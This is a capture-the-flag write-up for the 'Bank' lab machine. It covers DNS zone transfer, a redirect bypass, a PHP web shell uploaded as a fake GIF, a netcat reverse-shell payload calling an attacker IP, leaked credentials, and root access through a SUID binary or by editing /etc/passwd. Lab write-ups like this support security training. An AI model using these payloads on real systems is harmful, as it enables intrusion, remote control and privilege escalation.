# Bank
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan & DNS Zone Transfer | Identified open ports 22, 53, and 80. Used `dig axfr` to perform a DNS zone transfer on `bank.htb` to find subdomains. |
| 2 | (Web) | Vulnerable 302 Redirection (Unintended) | Discovered an issue where the web server would send a `302 Found` header but still deliver the page content. Used Burp Suite to intercept and change the response code to `200 OK` to access protected pages without authentication. |
| 3 | (Web) | File Upload & RCE | Found a file upload function on `/support.php`. Exploited a debug feature that executed files with the `.htb` extension as PHP, uploading a web shell and gaining code execution as the `www-data` user. |
| 4 | (Web) | Directory Enumeration & Credential Leakage | (Alternative Path) Found a directory `/balance-transfer` containing files. One file was improperly encrypted, revealing a cleartext password for a user named `chris`. |
| 5 | www-data -> root | SUID Binary | After gaining a shell, ran `linPEAS` and found a SUID binary at `/var/htb/bin/emergency`. Executing this binary immediately granted a root shell. |
| 6 | www-data -> root | Writable `/etc/passwd` | (Alternative Path) Discovered that `/etc/passwd` was world-writable. Generated a new password hash for the `root` user, edited the `/etc/passwd` file, and used `su root` to gain a root shell. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.99 seconds
```
Here we can see that we have port 53 opened running over TCP, which is odd.  
So, now we can try to enumerate this port.  
First we can try ```nslookup```:
```
[root@kali Bank ]$ nslookup    
> SERVER 10.10.10.29
Default server: 10.10.10.29
Address: 10.10.10.29#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
> 10.10.10.29
** server can't find 29.10.10.10.in-addr.arpa: NXDOMAIN
> bank.htb
Server:         10.10.10.29
Address:        10.10.10.29#53

Name:   bank.htb
Address: 10.10.10.29
```
As we can see the there is a record for bank.htb.  
Now we can try to use ```dnsrecon```, dsnrecon is a simple python script that enables to gather DNS-oriented information on  
a given target. Let try to use this tool against this target:
```
[root@kali Bank ]$ dnsrecon -r 127.0.0.1/24 -n 10.10.10.29               
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR localhost 127.0.0.1
[+] 1 Records Found
[root@kali Bank ]$ dnsrecon -r 10.10.10.29/24 -n 10.10.10.29
[*] Performing Reverse Lookup from 10.10.10.0 to 10.10.10.255
[+] 0 Records Found
```
As we can see there is only one PTR record set for localhost.  
Now, let's try to perform a DNS zone transfer using ```dig```, for the zone bank.htb:
```
[root@kali Bank ]$ dig axfr bank.htb @$TARGET
; <<>> DiG 9.16.15-Debian <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 31 msec
;; SERVER: 10.10.10.29#53(10.10.10.29)
;; WHEN: Wed Nov 03 12:23:45 CET 2021
;; XFR size: 6 records (messages 1, bytes 171)
```
Here we can see that we discovered few subdomains, so just add them to the /etc/hosts file and hit the webserver.
## User
### Method 1 - Vulnerable 302 Redirection (Unintended)
Poking around with burp we can see that when hitting /index.php we receive a 302 from the server, but below we can see some code which is odd.
```
HTTP/1.1 302 Found
Date: Thu, 04 Nov 2021 08:55:57 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: login.php
Content-Length: 7322
Connection: close
Content-Type: text/html

<div class="col-md-10">

    <div class="row">
        <div class="col-lg-3 col-md-6">
            <div class="panel panel-primary">
                <div class="panel-heading">
                    <div class="row">
                        <div class="col-xs-3">
                            <i class="fa fa-usd fa-5x"></i>
                        </div>
                        [ ... SNIP ... ]
```
So, if we manage to change the response code from 302 to 200, we will be able to render the page.  
To test this we can use burp and go under ```Proxy > Options > Intercept Server Responses > click on "Intercept Requests based
on the following rules"``` And now we can request /index.php, edit the the response code from 302 to 200 and now we will be able to render the page.  
Once we have tested that this works, we can create a match and replace rule so that burp will do this work automatically.  
In order to do this, we can navigate to ```Proxy > Options > Match and Replace > click on "Add"``` and create the rule as follow:
```
Type: response header
Match: 30[12] Found
Replace: 200 Ok
Regex match: true
```
Now also with intercept off we can see all the webserver pages without authenticating.  
If we request /support.php, we can see that there is an upload file function.  
This upload function takes only images, so we can try to cheat the checks and upload a payload using the following file.  
```
[root@kali Bank ]$ cat shell.gif.php          
GIF8
<?php echo system($_REQUEST['cmd']); ?>
[root@kali Bank ]$ file shell.gif.php
shell.gif.php: GIF image data 28735 x 28776
```
when we try to upload this we get an error like "file is not an image", but examining the code, we can se the below comment
```
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```
so, now we can creft the following request using .htb as file extension and upload our payload
```
POST /support.php HTTP/1.1
Host: bank.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------30419209283130348382134040843
Content-Length: 624
Origin: http://bank.htb
Connection: close
Referer: http://bank.htb/support.php
Cookie: HTBBankAuth=abhglbjitc02c6g3d1ur2pkpu7
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------30419209283130348382134040843
Content-Disposition: form-data; name="title"

asd
-----------------------------30419209283130348382134040843
Content-Disposition: form-data; name="message"

asdasd
-----------------------------30419209283130348382134040843
Content-Disposition: form-data; name="fileToUpload"; filename="shell.htb"
Content-Type: application/x-php

GIF8
<?php echo system($_REQUEST['cmd']); ?>

-----------------------------30419209283130348382134040843
Content-Disposition: form-data; name="submitadd"


-----------------------------30419209283130348382134040843--
```
Once Uploaded the payload we can creft the following request and get a reverse shell:
```
POST /uploads/shell.htb HTTP/1.1
Host: bank.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: HTBBankAuth=abhglbjitc02c6g3d1ur2pkpu7
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.18+4444+>/tmp/f
```
Got reverse shell.
```
root@kali:~/Documents/HTB/Boxes/Bank# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.29] 58878
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Method 2 - Credential leakage
Running gobuster against bank.htb, we can see the following results:
```
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
/server-status        (Status: 403) [Size: 288]
/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
```
if we open /balance-transfer directory, we can see some reports with encrypted information.  
now we can download this files to examine them and see if they contains some valuable information.  
If we run a word count and sort on all the balance transfer files, we can see that one file contains lot less characters.  
```
581 941e55bed0cb8052e7015e7133a5b9c7.acc
581 09ed7588d1cd47ffca297cc7dac22c52.acc
257 68576f20e9732f1b2edc4df5b8533230.acc
```
If we do open this file, we can see that the encryption failed and we have credential in cleartext
```
[root@kali balance-transfer ]$ cat 68576f20e9732f1b2edc4df5b8533230.acc                                    
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
this credentials can be used to access bank.htb.  
Now we can access the support page and, as we know, this page can be used to upload a shell and get code execution.
## Root
### Method 1 - SUID executable
Once we have the initial shell, we can run linpeas and see if there is any priversc vector.  
As we can see there is an executable with SUID bit set:
```
-rwsr-xr-x 1 root root 110K Jun 14  2017 /var/htb/bin/emergency (Unknown SUID binary)
```
If we try to run this we instantly have a shell as root
```
www-data@bank:/var/www/bank/uploads$ /var/htb/bin/emergency
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
138a92b65e22405ef03b60b0bb3ab784
```

### Method 2 - World writable /etc/passwd
Once we have the initial shell, we can run linpeas and see if there is any priversc vector.  
As we can see linpeas notice us that /etc/passwd file is writable by anyone.  
```
 ╔══════════╣ Permissions in init, init.d, systemd, and                                    
═╣ Writable passwd file? ................ /etc/passwd is writable
```
so now we can create a new password, edit the file and login with the created password.  
To create the password we can use openssl:
```
www-data@bank:/var/www/bank/uploads$ openssl passwd lucab0dd
XQJM6fcLUQoak
```
Now we can place the generated password inside /etc/passwd
```
root:XQJM6fcLUQoak:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```
now we can login as root with password lucab0dd:
```
www-data@bank:/var/www/bank/uploads$ su root
Password:
root@bank:/var/www/bank/uploads#
```
